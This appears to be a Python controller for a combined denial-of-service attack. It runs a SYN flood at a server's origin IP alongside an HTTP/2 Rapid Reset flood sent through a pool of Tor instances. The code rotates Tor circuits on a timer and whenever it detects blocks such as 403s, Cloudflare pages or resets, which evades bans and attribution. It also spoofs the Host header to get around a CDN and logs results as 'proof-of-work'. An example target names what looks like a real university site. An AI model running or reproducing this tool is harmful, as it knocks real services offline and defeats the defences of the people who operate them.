"""
Auto Mode v3 - SYN Flood + HTTP/2 Rapid Reset Combined Attack
Parallel engine with Tor auto-rotation, response detection, and persistent mode.

Spec:
  1. Auto-rotate IP via Tor every 30-60s
  2. Auto-detect 403/Connection reset -> trigger IP rotation
  3. 1-hour persistent flood (doesn't stop on errors)
  4. Origin IP attack with Host header spoofing
  5. SYN flood (direct) + Rapid Reset (via Tor) in parallel
  6. Auto-logging with timestamps
"""
import asyncio
import json
import logging
import os
import re
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

logger = logging.getLogger("auto_mode_v3")

GO_ENGINE = "bin/go_engine.exe"

STATUS_LOG_PATH = "logs/auto_mode_v3_status.json"

def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


class StatusLogger:
    """Logs every status change with timestamp for proof-of-work reporting."""

    def __init__(self, target: str, origin_ip: str, duration: int):
        self.target = target
        self.origin_ip = origin_ip
        self.duration = duration
        self.entries: List[Dict[str, Any]] = []
        self._last_status: Optional[str] = None
        self._log_count = 0

    def log(self, event: str, details: Dict[str, Any] = None):
        entry = {
            "ts": _ts(),
            "elapsed": time.time() - self._start_time if hasattr(self, '_start_time') else 0,
            "event": event,
        }
        if details:
            entry.update(details)
        self.entries.append(entry)
        self._log_count += 1
        # Print to console
        tag = f"[{event}]"
        detail_str = ""
        if details:
            detail_str = " " + " ".join(f"{k}={v}" for k, v in details.items())
        print(f"  {_ts()} {tag}{detail_str}")
        # Flush to file every 10 entries
        if self._log_count % 10 == 0:
            self._flush()

    def _flush(self):
        os.makedirs(os.path.dirname(STATUS_LOG_PATH), exist_ok=True)
        with open(STATUS_LOG_PATH, "w") as f:
            json.dump({
                "target": self.target,
                "origin_ip": self.origin_ip,
                "duration": self.duration,
                "entries": self.entries,
            }, f, indent=2)

    def set_start(self):
        self._start_time = time.time()
        entry = {
            "ts": _ts(),
            "elapsed": 0,
            "event": "START",
            "target": self.target,
            "origin_ip": self.origin_ip,
            "duration": self.duration,
        }
        self.entries.append(entry)
        self._flush()

    def finalize(self):
        self.log("FINISH", {"total_logs": len(self.entries)})
        self._flush()


class CombinedEngine:
    """
    Manages parallel execution of SYN flood and Rapid Reset via Go engine.
    Monitors stats from both and triggers Tor rotation on failure detection.
    """

    def __init__(
        self,
        target: str,
        origin_ip: str,
        duration: int,
        syn_threads: int = 500,
        rr_threads: int = 100,
        tor_instances: int = 15,
        rotation_interval: int = 45,
    ):
        self.target = target
        self.origin_ip = origin_ip
        self.duration = duration
        self.syn_threads = syn_threads
        self.rr_threads = rr_threads
        self.tor_instances = tor_instances
        self.rotation_interval = rotation_interval

        # Underlying Tor-manager instance
        self._tor_manager = None
        self._proxy_chain = ""  # SOCKS5 proxy chain for Go engine
        self._proxy_file = ""

        # Subprocess handles
        self._syn_proc: Optional[asyncio.subprocess.Process] = None
        self._rr_proc: Optional[asyncio.subprocess.Process] = None

        # Live stat dicts
        self.syn_stats: Dict[str, Any] = {"status": "idle", "stats": {}}
        self.rr_stats: Dict[str, Any] = {"status": "idle", "stats": {}}

        # Response detection state
        self._syn_consecutive_fail = 0
        self._rr_consecutive_fail = 0
        self._last_ban_detected = 0.0
        self._total_tor_rotations = 0
        self._last_rotate_ts = 0.0
        self._start_ts = 0.0

        # Logging
        self.logger = StatusLogger(target, origin_ip, duration)

        # Stats line regex
        self._stats_re = re.compile(
            r"\[STATS\].*?ok=(\d+).*?fail=(\d+).*?in_flight=(\d+).*?rps=([\d.]+)"
        )

    # ------------------------------------------------------------------
    # Tor management
    # ------------------------------------------------------------------

    async def _start_tor(self) -> bool:
        """Start Tor instances and build proxy chain."""
        try:
            from core.network.tor.manager import TorManager
        except ImportError:
            self.logger.log("TOR_ERROR", {"error": "TorManager import failed"})
            return False

        self.logger.log("TOR_START", {"instances": self.tor_instances})
        tor = TorManager(instances=self.tor_instances)
        tor.setup_instances()
        started = tor.start_all(wait_bootstrap=False)
        self._tor_manager = tor

        if started == 0:
            self.logger.log("TOR_ERROR", {"error": "No Tor instances started"})
            return False

        # Wait for bootstrap
        self.logger.log("TOR_BOOTSTRAP", {"started": started})
        bootstrap_start = time.time()
        bootstrap_timeout = 90
        while time.time() - bootstrap_start < bootstrap_timeout:
            bootstrapped = sum(
                1 for inst in tor.instances
                if inst.pid and self._check_tor_bootstrap(inst)
            )
            if bootstrapped >= started:
                break
            await asyncio.sleep(3)

        self.logger.log("TOR_BOOTSTRAP_DONE", {"bootstrapped": bootstrapped})

        # Build proxy chain (comma-separated for Go engine)
        socks_addrs = []
        for inst in tor.instances:
            if inst.pid:
                socks_addrs.append(f"socks5://127.0.0.1:{inst.socks_port}")

        if not socks_addrs:
            self.logger.log("TOR_ERROR", {"error": "No SOCKS proxies available"})
            return False

        # Use first instance as proxy chain
        self._proxy_chain = socks_addrs[0]
        self.logger.log("TOR_PROXY", {"chain": self._proxy_chain[:40] + "..."})

        # Also write proxy file for -proxy-file mode
        proxy_file_path = "proxies/_tor_pool_v3.txt"
        os.makedirs("proxies", exist_ok=True)
        with open(proxy_file_path, "w") as f:
            f.write("\n".join(socks_addrs))
        self._proxy_file = proxy_file_path

        return True

    @staticmethod
    def _check_tor_bootstrap(instance) -> bool:
        """Check if Tor instance has bootstrapped via log file."""
        from pathlib import Path
        log_path = Path("logs/tor") / f"tor{instance.instance_id}.log"
        if log_path.exists():
            try:
                content = log_path.read_text(encoding="utf-8", errors="replace")
                return "Bootstrapped 100%" in content
            except Exception:
                pass
        return False

    async def _rotate_tor(self):
        """Rotate all Tor instance circuits via NEWNYM signal."""
        if not self._tor_manager:
            return
        try:
            for inst in self._tor_manager.instances:
                if inst.pid:
                    try:
                        self._tor_manager.rotate_circuit(inst.instance_id)
                    except Exception:
                        pass
            self._total_tor_rotations += 1
            self._last_rotate_ts = time.time()
            self.logger.log("TOR_ROTATE", {
                "rotation": self._total_tor_rotations,
                "instances": len(self._tor_manager.instances),
            })
        except Exception as e:
            self.logger.log("TOR_ROTATE_ERROR", {"error": str(e)})

    # ------------------------------------------------------------------
    # Go engine subprocess management
    # ------------------------------------------------------------------

    async def _launch_syn_flood(self):
        """Launch SYN flood via Go engine (direct to origin IP)."""
        args = [
            GO_ENGINE,
            "-target", self.target,
            "-duration", str(self.duration),
            "-method", "syn-flood",
            "-threads", str(self.syn_threads),
            "-rps", "100000",
        ]
        if self.origin_ip:
            args.extend(["-origin", self.origin_ip])

        self.logger.log("SYN_LAUNCH", {"args": " ".join(args)})

        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self._syn_proc = proc
        return proc

    async def _launch_rapid_reset(self):
        """Launch Rapid Reset via Go engine (through Tor proxy chain)."""
        args = [
            GO_ENGINE,
            "-target", self.target,
            "-duration", str(self.duration),
            "-method", "rapid-reset",
            "-threads", str(self.rr_threads),
            "-rps", "100000",
            "-http2",
        ]
        if self._proxy_chain:
            args.extend(["-proxy-chain", self._proxy_chain])
        elif self._proxy_file:
            args.extend(["-proxy-file", self._proxy_file])

        self.logger.log("RR_LAUNCH", {"args": " ".join(args)})

        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self._rr_proc = proc
        return proc

    # ------------------------------------------------------------------
    # Stream monitoring & response detection
    # ------------------------------------------------------------------

    async def _monitor_stream(self, stream, engine_name: str, stats_dict: dict):
        """Read process output and parse stats."""
        try:
            while True:
                line = await stream.readline()
                if not line:
                    break
                text = line.decode(errors="replace").strip()
                if not text:
                    continue

                # Parse [STATS] lines
                m = self._stats_re.search(text)
                if m:
                    ok = int(m.group(1))
                    fail = int(m.group(2))
                    in_flight = int(m.group(3))
                    rps_val = float(m.group(4))
                    stats_dict["stats"] = {
                        "completed": ok,
                        "failed": fail,
                        "in_flight": in_flight,
                        "current_rps": rps_val,
                    }
                    continue

                # Check for error indicators in output
                if engine_name == "rr":
                    self._detect_rr_error(text)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.debug(f"{engine_name} stream error: {e}")

    def _detect_rr_error(self, text: str):
        """Detect 403/Connection reset / 502/503/520 in Go engine output."""
        now = time.time()
        lower = text.lower()

        # Check for ban/drop indicators
        is_ban = any(kw in lower for kw in [
            "403", "forbidden", "access denied", "cloudflare",
            "connection reset", "connection refused",
            "502", "503", "520", "bad gateway", "origin error",
            "timeout", "deadline exceeded",
            "wsarecv", "writesock", "connection closed",
        ])

        if is_ban:
            # Count consecutive failures
            self._rr_consecutive_fail += 1
            if self._rr_consecutive_fail >= 3:
                elapsed_since_last_rotation = now - self._last_ban_detected
                # Only rotate if we haven't rotated in the last 20s
                if elapsed_since_last_rotation > 20:
                    self.logger.log("BAN_DETECTED", {
                        "consecutive_fails": self._rr_consecutive_fail,
                        "text": text[:120],
                    })
                    self._last_ban_detected = now
                    # Trigger rotation via event
                    asyncio.create_task(self._rotate_tor())
                    self._rr_consecutive_fail = 0
        else:
            # Reset on normal output
            self._rr_consecutive_fail = 0

    def _check_rr_stats_for_ban(self):
        """Check rapid-reset stats for ban detection (fail rate > 80%)."""
        stats = self.rr_stats.get("stats", {})
        completed = stats.get("completed", 0)
        failed = stats.get("failed", 0)
        total = completed + failed
        if total > 100 and failed > 0:
            fail_rate = failed / total
            if fail_rate > 0.8:
                now = time.time()
                elapsed_since_last = now - self._last_ban_detected
                if elapsed_since_last > 20:
                    self.logger.log("BAN_STATS", {
                        "fail_rate": f"{fail_rate:.0%}",
                        "completed": completed,
                        "failed": failed,
                    })
                    self._last_ban_detected = now
                    asyncio.create_task(self._rotate_tor())

    # ------------------------------------------------------------------
    # Monitoring loop
    # ------------------------------------------------------------------

    async def _monitor_loop(self):
        """Periodic monitoring for IP rotation based on response detection."""
        while True:
            await asyncio.sleep(5)

            # Check elapsed time for rotation interval
            now = time.time()
            elapsed = now - self._start_ts
            time_since_last_rotate = now - self._last_rotate_ts

            # Auto-rotate every rotation_interval seconds
            if time_since_last_rotate >= self.rotation_interval and elapsed > 30:
                await self._rotate_tor()

            # Check rapid-reset stats for ban detection
            self._check_rr_stats_for_ban()

            # Log current status periodically
            if int(elapsed) % 30 < 5:
                syn_s = self.syn_stats.get("stats", {})
                rr_s = self.rr_stats.get("stats", {})
                self.logger.log("STATUS", {
                    "elapsed": f"{elapsed:.0f}s",
                    "syn_ok": syn_s.get("completed", 0),
                    "syn_fail": syn_s.get("failed", 0),
                    "rr_ok": rr_s.get("completed", 0),
                    "rr_fail": rr_s.get("failed", 0),
                    "tor_rotations": self._total_tor_rotations,
                })

    # ------------------------------------------------------------------
    # Main entry
    # ------------------------------------------------------------------

    async def run(self) -> Dict[str, Any]:
        """Run combined attack: SYN flood + Rapid Reset in parallel."""
        self._start_ts = time.time()
        self.logger.set_start()
        print(f"\n{'='*60}")
        print(f"  AUTO MODE V3 - COMBINED ATTACK")
        print(f"  Target: {self.target}")
        print(f"  Origin: {self.origin_ip}")
        print(f"  Duration: {self.duration}s")
        print(f"  Tor rotation interval: {self.rotation_interval}s")
        print(f"{'='*60}\n")

        # Phase 1: Start Tor
        print(f"\n[*] Phase 1: Starting Tor instances...")
        tor_ok = await self._start_tor()
        if not tor_ok:
            print(f"  [!] Tor failed - running without proxy (direct only)")
            self.logger.log("WARNING", {"detail": "Tor failed, direct mode only"})

        # Phase 2: Launch SYN flood
        print(f"\n[*] Phase 2: Launching SYN Flood (direct to origin)...")
        syn_proc = await self._launch_syn_flood()

        # Phase 3: Launch Rapid Reset
        print(f"\n[*] Phase 3: Launching Rapid Reset (via Tor)...")
        rr_proc = await self._launch_rapid_reset()

        # Phase 4: Monitor both
        print(f"\n[*] Phase 4: Monitoring attack (duration: {self.duration}s)...")
        print(f"  Auto-rotating Tor every {self.rotation_interval}s")
        print(f"  Ban detection: 3 consecutive errors -> rotate\n")

        self.logger.log("ATTACK_START", {
            "target": self.target,
            "origin_ip": self.origin_ip,
            "duration": self.duration,
            "tor_ok": tor_ok,
        })

        # Start stream readers
        syn_reader = asyncio.create_task(
            self._monitor_stream(syn_proc.stdout, "syn", self.syn_stats)
        )
        syn_err_reader = asyncio.create_task(
            self._monitor_stream(syn_proc.stderr, "syn", self.syn_stats)
        )
        rr_reader = asyncio.create_task(
            self._monitor_stream(rr_proc.stdout, "rr", self.rr_stats)
        )
        rr_err_reader = asyncio.create_task(
            self._monitor_stream(rr_proc.stderr, "rr", self.rr_stats)
        )

        # Start monitoring loop
        monitor_task = asyncio.create_task(self._monitor_loop())

        # Wait for full duration (both processes run independently)
        try:
            # Wait with a bit more than duration for drain
            wait_time = self.duration + 30
            await asyncio.sleep(wait_time)
        except asyncio.CancelledError:
            print(f"\n  [!] Attack cancelled by user")
            self.logger.log("CANCELLED", {})

        # Phase 5: Shutdown
        print(f"\n[*] Phase 5: Shutting down engines...")
        self.logger.log("SHUTDOWN", {})

        # Kill processes
        for proc, name in [(self._syn_proc, "SYN"), (self._rr_proc, "RR")]:
            if proc and proc.returncode is None:
                try:
                    proc.kill()
                    await proc.wait()
                    print(f"  [+] {name} stopped")
                except Exception as e:
                    print(f"  [!] {name} kill error: {e}")

        # Cancel readers
        for task in [syn_reader, syn_err_reader, rr_reader, rr_err_reader, monitor_task]:
            task.cancel()

        # Stop Tor
        if self._tor_manager:
            try:
                self._tor_manager.stop_all()
                print(f"  [+] Tor instances stopped")
                self.logger.log("TOR_STOP", {"instances": len(self._tor_manager.instances)})
            except Exception as e:
                print(f"  [!] Tor stop error: {e}")

        # Aggregate metrics
        syn_s = self.syn_stats.get("stats", {})
        rr_s = self.rr_stats.get("stats", {})
        result = {
            "engine": "auto_mode_v3",
            "target": self.target,
            "origin_ip": self.origin_ip,
            "duration_real": time.time() - self._start_ts,
            "syn_total": syn_s.get("completed", 0) + syn_s.get("failed", 0),
            "syn_completed": syn_s.get("completed", 0),
            "syn_failed": syn_s.get("failed", 0),
            "rr_total": rr_s.get("completed", 0) + rr_s.get("failed", 0),
            "rr_completed": rr_s.get("completed", 0),
            "rr_failed": rr_s.get("failed", 0),
            "tor_rotations": self._total_tor_rotations,
            "combined_total": (
                syn_s.get("completed", 0) + syn_s.get("failed", 0)
                + rr_s.get("completed", 0) + rr_s.get("failed", 0)
            ),
        }

        self.logger.log("RESULT", result)
        self.logger.finalize()

        # Print results
        print(f"\n{'='*60}")
        print(f"  RESULTS")
        print(f"{'='*60}")
        print(f"  SYN Flood:")
        print(f"    Completed: {result['syn_completed']:,}")
        print(f"    Failed:    {result['syn_failed']:,}")
        print(f"  Rapid Reset:")
        print(f"    Completed: {result['rr_completed']:,}")
        print(f"    Failed:    {result['rr_failed']:,}")
        print(f"  Tor rotations: {result['tor_rotations']}")
        print(f"  Combined total: {result['combined_total']:,}")
        print(f"  Status log: {STATUS_LOG_PATH}")
        print(f"{'='*60}\n")

        return result


async def run_auto_mode_v3(
    target: str,
    origin_ip: str,
    duration: int = 3600,
    syn_threads: int = 500,
    rr_threads: int = 100,
    tor_instances: int = 15,
    rotation_interval: int = 45,
) -> Dict[str, Any]:
    """
    Public entry point for Auto Mode v3.
    Launches combined SYN flood + Rapid Reset attack.

    Args:
        target: Target URL (e.g., https://fh.ubk.ac.id/)
        origin_ip: Server origin IP for direct SYN flood
        duration: Attack duration in seconds
        syn_threads: Goroutines for SYN flood
        rr_threads: Goroutines for Rapid Reset
        tor_instances: Number of Tor instances to use
        rotation_interval: Seconds between Tor IP rotations

    Returns:
        Dict with aggregated results
    """
    engine = CombinedEngine(
        target=target,
        origin_ip=origin_ip,
        duration=duration,
        syn_threads=syn_threads,
        rr_threads=rr_threads,
        tor_instances=tor_instances,
        rotation_interval=rotation_interval,
    )
    return await engine.run()
